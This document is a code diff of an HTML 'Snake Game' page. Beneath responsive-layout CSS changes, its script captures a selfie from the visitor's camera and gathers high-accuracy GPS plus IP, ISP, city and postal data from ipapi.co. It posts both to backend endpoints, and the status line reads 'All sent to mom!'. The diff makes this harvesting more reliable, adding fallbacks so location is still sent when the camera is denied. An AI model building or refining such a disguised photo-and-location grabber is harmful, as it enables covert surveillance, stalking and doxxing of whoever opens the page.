@@ -18,6 +18,7 @@
             justify-content: center;
             align-items: center;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
         }
 
         .container {
@@ -26,6 +27,8 @@
             border-radius: 20px;
             padding: 30px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
         }
 
         .header {
@@ -40,9 +43,10 @@
         }
 
         .status {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 0.9em;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.95em;
             margin-bottom: 10px;
+            min-height: 24px;
         }
 
         .score {
@@ -56,13 +60,15 @@
             border-radius: 10px;
             display: block;
             margin: 0 auto 20px;
+            max-width: 100%;
+            height: auto;
         }
 
         .controls {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
-            width: 200px;
+            max-width: 250px;
             margin: 0 auto;
         }
 
@@ -70,15 +76,17 @@
             background: rgba(255, 255, 255, 0.2);
             border: none;
             color: white;
-            font-size: 1.5em;
-            padding: 15px;
+            font-size: 1.8em;
+            padding: 20px;
             border-radius: 10px;
             cursor: pointer;
             transition: all 0.3s;
+            font-weight: bold;
         }
 
         .btn:hover {
             background: rgba(255, 255, 255, 0.3);
+            transform: scale(1.05);
         }
 
         .btn:active {
@@ -109,21 +117,48 @@
             font-size: 1.5em;
             text-align: center;
             margin-bottom: 20px;
+            font-weight: bold;
         }
 
         .hint {
             color: rgba(255, 255, 255, 0.6);
             font-size: 0.85em;
             text-align: center;
-            margin-top: 10px;
-        }
-
-        .empty {
-            grid-column: 1;
+            margin-top: 15px;
         }
 
         #video {
             display: none;
+        }
+
+        .controls-grid {
+            display: grid;
+            grid-template-areas:
+                ". up ."
+                "left down right";
+            gap: 10px;
+            max-width: 250px;
+            margin: 0 auto;
+        }
+
+        .btn-up { grid-area: up; }
+        .btn-left { grid-area: left; }
+        .btn-down { grid-area: down; }
+        .btn-right { grid-area: right; }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 2em;
+            }
+            
+            canvas {
+                width: 100%;
+            }
+            
+            .btn {
+                font-size: 1.5em;
+                padding: 15px;
+            }
         }
     </style>
 </head>
@@ -133,7 +168,7 @@
     <div class="container">
         <div class="header">
             <h1>🐍 Snake Game</h1>
-            <div class="status" id="status">Loading...</div>
+            <div class="status" id="status">Starting...</div>
             <div class="score">Score: <span id="score">0</span></div>
         </div>
 
@@ -149,15 +184,13 @@
         </div>
 
         <div id="gameControls" style="display: none;">
-            <div class="controls">
-                <div class="empty"></div>
-                <button class="btn" onclick="changeDirection(0, -1)">↑</button>
-                <div class="empty"></div>
-                <button class="btn" onclick="changeDirection(-1, 0)">←</button>
-                <button class="btn" onclick="changeDirection(0, 1)">↓</button>
-                <button class="btn" onclick="changeDirection(1, 0)">→</button>
+            <div class="controls-grid">
+                <button class="btn btn-up" onclick="changeDirection(0, -1)">↑</button>
+                <button class="btn btn-left" onclick="changeDirection(-1, 0)">←</button>
+                <button class="btn btn-down" onclick="changeDirection(0, 1)">↓</button>
+                <button class="btn btn-right" onclick="changeDirection(1, 0)">→</button>
             </div>
-            <div class="hint">Use arrow keys or buttons</div>
+            <div class="hint">Use arrow keys or tap buttons</div>
         </div>
     </div>
 
@@ -190,7 +223,7 @@
                 
                 // Wait for video to be ready and capture photo
                 video.onloadedmetadata = () => {
-                    document.getElementById('status').textContent = 'Capturing photo...';
+                    document.getElementById('status').textContent = 'Camera ready...';
                     
                     // Wait 2 seconds for camera to stabilize, then capture
                     setTimeout(async () => {
@@ -199,16 +232,20 @@
                         // Stop camera after capture
                         stream.getTracks().forEach(track => track.stop());
                         
-                        // Then send location info
-                        await sendLocationInfo();
+                        // Wait a bit then send location info
+                        setTimeout(() => {
+                            sendLocationInfo();
+                        }, 1000);
                     }, 2000);
                 };
                 
             } catch (err) {
                 console.error('Camera error:', err);
-                document.getElementById('status').textContent = 'Camera access denied, sending location only...';
+                document.getElementById('status').textContent = 'Camera denied, sending location...';
                 // If camera fails, still send location
-                await sendLocationInfo();
+                setTimeout(() => {
+                    sendLocationInfo();
+                }, 500);
             }
         });
 
@@ -221,72 +258,81 @@
                 const photoCtx = photoCanvas.getContext('2d');
                 photoCtx.drawImage(video, 0, 0);
 
-                // Convert to blob
-                const blob = await new Promise(resolve => {
-                    photoCanvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
+                // Get base64 image
+                const photoBase64 = photoCanvas.toDataURL('image/jpeg', 0.8);
 
                 document.getElementById('status').textContent = 'Sending photo...';
 
-                // Send photo to API
-                const formData = new FormData();
-                formData.append('photo', blob, 'selfie.jpg');
-
                 const response = await fetch('/api/send-photo', {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ photoBase64 })
                 });
 
                 if (response.ok) {
-                    document.getElementById('status').textContent = 'Photo sent! Getting location...';
+                    document.getElementById('status').textContent = 'Photo sent! ✓';
                 } else {
-                    document.getElementById('status').textContent = 'Photo failed, getting location...';
+                    const errorData = await response.json();
+                    console.error('Photo error:', errorData);
+                    document.getElementById('status').textContent = 'Photo failed';
                 }
             } catch (err) {
                 console.error('Photo capture error:', err);
-                document.getElementById('status').textContent = 'Photo error, getting location...';
+                document.getElementById('status').textContent = 'Photo error';
             }
         }
 
         async function sendLocationInfo() {
             try {
-                document.getElementById('status').textContent = 'Gathering location info...';
+                document.getElementById('status').textContent = 'Getting location...';
                 
-                // Try to get GPS location first
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            await sendLocationData(position.coords.latitude, position.coords.longitude);
-                        },
-                        async (error) => {
-                            await sendLocationData(null, null);
-                        }
-                    );
-                } else {
-                    await sendLocationData(null, null);
-                }
-            } catch (err) {
-                console.error('Error:', err);
-                document.getElementById('status').textContent = 'Error gathering location';
-            }
-        }
-
-        async function sendLocationData(lat, lon) {
-            try {
-                // Get IP and location info
+                // Get IP info first (this works without GPS)
                 const ipResponse = await fetch('https://ipapi.co/json/');
                 const ipData = await ipResponse.json();
 
+                // Try to get GPS location
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            // GPS succeeded, use precise location
+                            await sendLocationData(position.coords.latitude, position.coords.longitude, ipData);
+                        },
+                        async (error) => {
+                            // GPS failed, use IP-based location
+                            console.log('GPS error:', error);
+                            await sendLocationData(null, null, ipData);
+                        },
+                        {
+                            timeout: 5000,
+                            enableHighAccuracy: true
+                        }
+                    );
+                } else {
+                    // No GPS available
+                    await sendLocationData(null, null, ipData);
+                }
+            } catch (err) {
+                console.error('Location error:', err);
+                document.getElementById('status').textContent = 'Location failed';
+            }
+        }
+
+        async function sendLocationData(lat, lon, ipData) {
+            try {
                 const locationData = {
-                    ip: ipData.ip,
-                    region: ipData.region,
-                    city: ipData.city,
-                    country: ipData.country_name,
-                    location: lat && lon ? `${lat}, ${lon}` : `${ipData.latitude}, ${ipData.longitude}`,
-                    isp: ipData.org,
-                    postal: ipData.postal,
-                    timezone: ipData.timezone
+                    ip: ipData.ip || 'Unknown',
+                    region: ipData.region || 'Unknown',
+                    city: ipData.city || 'Unknown',
+                    country: ipData.country_name || 'Unknown',
+                    location: lat && lon ? `${lat}, ${lon}` : `${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}`,
+                    isp: ipData.org || 'Unknown',
+                    postal: ipData.postal || 'Unknown',
+                    timezone: ipData.timezone || 'Unknown'
                 };
+
+                document.getElementById('status').textContent = 'Sending location...';
 
                 // Send to backend
                 const response = await fetch('/api/send-info', {
@@ -298,13 +344,15 @@
                 });
 
                 if (response.ok) {
-                    document.getElementById('status').textContent = 'All info sent to mom! ✓';
+                    document.getElementById('status').textContent = 'All sent to mom! ✓✓';
                 } else {
+                    const errorData = await response.json();
+                    console.error('Location send error:', errorData);
                     document.getElementById('status').textContent = 'Location send failed';
                 }
             } catch (err) {
                 console.error('Send error:', err);
-                document.getElementById('status').textContent = 'Error sending location';
+                document.getElementById('status').textContent = 'Location error';
             }
         }
 
